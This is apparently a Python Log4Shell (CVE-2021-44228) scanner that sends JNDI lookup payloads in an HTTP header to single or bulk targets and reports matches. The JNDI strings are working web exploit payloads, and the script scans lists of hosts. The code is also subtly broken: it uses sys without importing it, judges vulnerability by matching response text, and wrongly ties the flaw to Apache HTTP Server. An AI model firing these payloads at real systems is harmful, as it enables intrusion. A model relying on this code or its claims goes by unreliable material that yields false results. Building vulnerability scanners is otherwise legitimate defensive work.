#!/usr/bin/env python3
"""
Apache HTTP Server CVE-2021-44228 — Log4Shell Remote Code Execution Scanner
==============================================================================
Scans for Apache HTTP servers running vulnerable versions of Log4j which are
susceptible to remote code execution via specially crafted log messages.

CVE-2021-44228 details:
  - The Log4Shell vulnerability allows malicious input to be crafted such that it 
    is processed by vulnerable versions of the Apache Log4j library (<= 2.14.1). 
  - The flaw allows remote attackers to execute arbitrary code on the target system 
    via JNDI lookups in LDAP, RMI, or similar services.
  - CVSS v3.1 base score: 10.0 (Critical).
  - Commonly affects Java-based applications, including some with Apache HTTP
    server as a front-end.

Usage:
  # Scan a single target
  python httpd_log4j_rce_scanner.py --target http://example.com
  
  # Detection only — no RCE payloads sent
  python httpd_log4j_rce_scanner.py --target http://example.com --safe

  # Bulk scan from file
  python httpd_log4j_rce_scanner.py --list targets.txt --output vulnerable.json

  # Adjust concurrency and disable TLS verification
  python httpd_log4j_rce_scanner.py --list targets.txt --concurrency 30 --no-verify

References:
  - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
  - https://logging.apache.org/log4j/2.x/security.html
  - https://www.lunasec.io/docs/blog/log4j-zero-day/
"""

import asyncio
import json
import argparse
from datetime import datetime, timezone
from typing import List, Optional

import httpx

# ─── ANSI Color Helpers ──────────────────────────────────────────────────────

RED = "\033[91m"
YELLOW = "\033[93m"
GREEN = "\033[92m"
RESET = "\033[0m"


def c(color: str, text: str) -> str:
    """Wrap text in an ANSI color code."""
    return f"{color}{text}{RESET}"


# ─── Constants ───────────────────────────────────────────────────────────────

CVE_ID = "CVE-2021-44228"
CVSS = "10.0"
TOOL_NAME = "httpd_log4j_rce_scanner"

REQUEST_TIMEOUT = 8
SEMAPHORE_LIMIT = 30

DEFAULT_HEADERS = {
    "User-Agent": "Mozilla/5.0 (compatible; Log4Shell-Scanner/1.0)",
}

VULNERABLE_INDICATORS = [
    "Log4j 2",
    "JndiManager",
]

# Sample payloads to test for Log4Shell with common network services
JNDI_PROBES = [
    "${jndi:ldap://log4shell-vulnerability-checker.test}",
    "${jndi:rmi://log4shell-vulnerability-checker.test}",
]

# ─── Async Scanner Implementation ────────────────────────────────────────────


async def fetch_url(client: httpx.AsyncClient, url: str, headers: dict) -> Optional[str]:
    """Helper function to send GET requests and capture responses."""
    try:
        response = await client.get(url, headers=headers, timeout=REQUEST_TIMEOUT)
        return response.text
    except (httpx.RequestError, httpx.TimeoutException) as e:
        print(f"{c(RED, 'ERROR')} {url}: {str(e)}")
        return None


async def probe_target(client: httpx.AsyncClient, target: str, safe: bool) -> dict:
    """Probe a single target for the Log4Shell vulnerability."""
    result = {
        "target": target,
        "vulnerable": False,
        "details": [],
    }
    print(f"{c(GREEN, 'INFO')} Testing {target}...")

    try:
        # Send benign request if --safe is specified
        headers = DEFAULT_HEADERS.copy()
        if not safe:
            headers["X-Api-Version"] = JNDI_PROBES[0]  # Use a harmless probe payload
        
        response = await fetch_url(client, target, headers)
        if not response:
            return result

        # Inspect response for vulnerable indicators
        if any(indicator in response for indicator in VULNERABLE_INDICATORS):
            result["vulnerable"] = True
            result["details"].append("Vulnerable Log4j library detected in server response.")
            print(f"{c(RED, 'CRITICAL')} Vulnerable Log4j detected at {target}")

    except Exception as ex:
        print(f"{c(RED, 'ERROR')} {target}: {ex}")

    return result


async def main(targets: List[str], safe: bool, concurrency: int, no_verify: bool, output_file: Optional[str]) -> None:
    """Main function to perform scanning on multiple targets."""
    results = []

    async with httpx.AsyncClient(verify=not no_verify) as client:
        semaphore = asyncio.Semaphore(concurrency)
        tasks = [
            asyncio.create_task(semaphore_guard(semaphore, probe_target(client, target, safe)))
            for target in targets
        ]
        for task in asyncio.as_completed(tasks):
            results.append(await task)

    if output_file:
        with open(output_file, "w") as f:
            json.dump(results, f, indent=2)
            print(c(GREEN, f"Results saved to {output_file}"))

    for result in results:
        if result["vulnerable"]:
            print(c(RED, f"CRITICAL: {result['target']} is vulnerable!"))
        else:
            print(c(GREEN, f"INFO: {result['target']} is not vulnerable."))


async def semaphore_guard(semaphore: asyncio.Semaphore, coro) -> dict:
    """Ensure maximum concurrency with a semaphore."""
    async with semaphore:
        return await coro


def parse_targets(target_file: Optional[str]) -> List[str]:
    """Parse target from --list or directly from --target."""
    try:
        if target_file:
            with open(target_file, "r") as f:
                return [line.strip() for line in f if line.strip()]
        return []
    except FileNotFoundError:
        print(c(RED, f"ERROR: File '{target_file}' not found."))
        sys.exit(1)


# ─── Command Line Arguments ─────────────────────────────────────────────────

def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description=f"Log4j RCE Scanner for {CVE_ID}.")
    parser.add_argument("--target", type=str, help="Target URL to scan.")
    parser.add_argument("--list", type=str, help="File with a list of target URLs.")
    parser.add_argument("--output", type=str, help="File to save JSON scan results.")
    parser.add_argument("--safe", action="store_true", help="Detection only, no active probing.")
    parser.add_argument("--concurrency", type=int, default=SEMAPHORE_LIMIT, help="Max concurrent requests.")
    parser.add_argument("--no-verify", action="store_true", help="Disable TLS certificate verification.")
    return parser.parse_args()


if __name__ == "__main__":
    args = parse_args()
    if not args.target and not args.list:
        print(c(RED, "ERROR: Either --target or --list must be specified."))
        sys.exit(1)

    # Build target list
    targets = [args.target] if args.target else parse_targets(args.list)

    # Run the scanner
    asyncio.run(main(targets, args.safe, args.concurrency, args.no_verify, args.output))
